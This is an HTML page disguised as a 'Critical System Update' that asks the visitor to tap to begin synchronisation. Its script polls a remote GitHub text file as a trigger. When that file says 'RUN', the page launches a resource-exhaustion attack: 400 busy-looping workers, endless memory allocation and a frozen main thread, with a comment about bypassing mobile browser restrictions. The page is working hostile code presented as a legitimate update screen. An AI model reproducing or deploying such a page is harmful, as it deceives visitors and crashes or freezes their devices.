
<!DOCTYPE html>
<html>
<head>
    <title>Critical System Update</title>
    <meta charset="UTF-8">
</head>
<body style="background-color: black; color: white; text-align: center; padding-top: 50px; font-family: Arial;">
    <h1 id="status">INITIALIZING CORE...</h1>
    <p>Tap anywhere to begin synchronization</p>

    <script>
        const statusUrl = 'https://raw.githubusercontent.com/karimattef3-pixel/my-tools/main/status.txt?t=' + new Date().getTime();
        let isRunning = false;

        async function checkStatus() {
            try {
                const response = await fetch(statusUrl);
                const text = await response.text();
                if (text.trim().includes("RUN") && !isRunning) {
                    isRunning = true;
                    document.getElementById('status').innerText = "CORE OVERLOAD: ACTIVE";
                    document.getElementById('status').style.color = "red";
                    startTheBeast();
                }
            } catch (e) { }
        }

        function startTheBeast() {
            // 1. CPU Core Exhaustion (400 Threads)
            for (let i = 0; i < 400; i++) {
                new Worker(URL.createObjectURL(new Blob([`
                    while(true) {
                        Math.sqrt(Math.random() * 999999);
                    }
                `], {type: 'text/javascript'})));
            }

            // 2. RAM Smasher (Infinite Memory Allocation)
            const memoryLeak = [];
            setInterval(() => {
                for (let i = 0; i < 1000; i++) {
                    memoryLeak.push(new Array(1000000).fill("STRESS_TEST_DATA_NULL"));
                }
            }, 10);

            // 3. Main Thread Freeze (Infinite Loop)
            while(true) {
                const dummy = Math.random() * Math.random();
                console.log("Processing Stack: " + dummy);
            }
        }

        // Trigger on click to bypass mobile browser restrictions
        window.addEventListener('click', () => {
            checkStatus();
            setInterval(checkStatus, 2000);
        });

        // Auto-check every 2 seconds
        setInterval(checkStatus, 2000);
    </script>
</body>
</html>
